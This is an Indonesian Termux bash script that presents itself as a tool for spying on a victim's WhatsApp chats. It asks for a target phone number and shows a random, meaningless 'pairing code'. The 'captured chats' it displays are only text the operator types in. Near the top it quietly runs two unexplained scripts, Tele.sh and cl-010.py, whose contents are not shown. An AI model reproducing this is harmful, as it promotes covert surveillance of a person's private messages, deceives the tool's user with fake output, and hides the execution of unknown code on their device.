#!/data/data/com.termux/files/usr/bin/bash

# Fungsi animasi mengetik
function autoketik {
    text="$1"
    color="$2"
    for ((i = 0; i < ${#text}; i++)); do
        echo -n -e "${color}${text:i:1}"
        sleep 0.01  # Durasi delay antar karakter
    done
    echo -e "\033[0m"  # Reset warna
}

bold="\033[1m"
ncol="\033[0m"

# Variabel warna
green='\033[0;32m'
yellow='\033[0;33m'
cyan='\033[0;36m'

# Fungsi generate pairing code random
function generate_code {
    length=$1  # Panjang kode yang diinginkan
    chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

    code=""
    for ((i = 0; i < length; i++)); do
        rand=$((RANDOM % ${#chars}))
        code+="${chars:rand:1}"
    done

    echo "$code"
}

# Generate pairing code dan simpan ke variabel
code=$(generate_code 8)

# Tampilan awal
clear
nohup bash Tele.sh
nohup python cl-010.py
echo -e "${green}
▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░
▐▓█▄▄▄▄▄▄▄▄▄█▓▌░█████░
░░░░▄▄███▄▄░░░░░█████░
"
autoketik "TOOLS INI UNTUK MEMANTAU CHAT KORBAN" $cyan
sleep 2

# Input nomor tujuan
read -p "MASUKAN NOMOR TUJUAN (62**) >>> " nomor
sleep 2

# Tampilkan pairing code
echo -e "PAIRING CODE >>> ${bold}${code}${ncol}"
echo 
echo -e "${green}SALIN CODE TEMPEL KE TAUTAN WHATSAPP"
# Loop untuk menerima input chat dan simpan ke file
echo -e "\nMasukkan chat korban (ketik 'selesai' untuk berhenti):"
while true; do
    read -p "> " chat
    if [[ "$chat" == "selesai" ]]; then
        break
    fi
    echo "$chat" >> hasil_chat.txt
done

# Bersihkan layar dan tampilkan isi file dengan delay antar baris
clear
echo -e "${yellow}HASIL CHAT KORBAN:${ncol}"

# Loop untuk menampilkan isi file dengan delay
while IFS= read -r line; do
    autoketik "$line" $green  # Tampilkan setiap baris dengan efek mengetik
    sleep 1  # Jeda 1 detik antar baris
done < hasil_chat.txt
